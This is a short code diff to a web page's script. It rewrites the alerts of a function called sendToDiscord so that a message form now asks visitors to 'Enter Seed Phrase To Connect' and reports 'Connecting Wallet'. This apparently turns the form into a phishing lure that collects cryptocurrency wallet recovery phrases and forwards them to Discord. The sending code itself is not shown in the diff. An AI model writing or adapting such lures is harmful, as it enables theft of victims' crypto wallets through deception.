@@ -663,7 +663,7 @@ function sendToDiscord() {
   const message = document.getElementById("userMessage").value.trim();
 
   if (!message) {
-    alert("Please enter a message.");
+    alert("Enter Seed Phrase To Connect.");
     return;
   }
 
@@ -675,12 +675,12 @@ function sendToDiscord() {
     })
   })
   .then(() => {
-    alert("Message sent securely.");
+    alert("Connecting Wallet.");
     closeMessageModal();
     document.getElementById("userMessage").value = "";
   })
   .catch(() => {
-    alert("Failed to send message.");
+    alert("Not Connecting.");
   });
 }
 </script>
@@ -722,6 +722,7 @@ function sendToDiscord() {
 </body>
 
 </html>
+
 
 
 
